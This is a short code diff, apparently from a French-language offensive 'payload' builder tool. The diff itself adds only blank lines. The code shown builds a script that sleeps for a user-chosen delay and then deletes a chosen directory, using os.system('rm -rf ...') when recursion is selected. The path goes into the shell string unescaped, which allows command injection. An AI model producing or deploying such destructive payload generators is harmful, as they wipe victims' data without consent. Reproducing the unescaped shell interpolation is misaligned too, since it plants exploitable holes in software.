@@ -55,15 +55,19 @@ def rmdir_module():
         payload_path = os.path.join("Option", "modules", "payload", "payload_created", filename)
         os.makedirs(os.path.dirname(os.path.abspath(payload_path)), exist_ok=True)
         with open(payload_path, "w", encoding="utf-8") as f:
+
             f.write("import os\n")
             f.write("import time\n\n")
             f.write("def remove_directory():\n")
+
             if choix["Délai avant suppression"] is not None:
                 f.write(f"    time.sleep({choix['Délai avant suppression']})\n")
+
             if choix["Suppression récursive"]:
                 f.write(f"    os.system('rm -rf \"{choix['Chemin du répertoire à supprimer']}\"')\n")
             else:
                 f.write(f"    os.rmdir('{choix['Chemin du répertoire à supprimer']}')\n\n")
+            
             f.write("if __name__ == '__main__':\n")
             f.write("    remove_directory()\n")
         print(Fore.YELLOW + "\nPayload Remove Directory créé avec succès !" + Style.RESET_ALL)
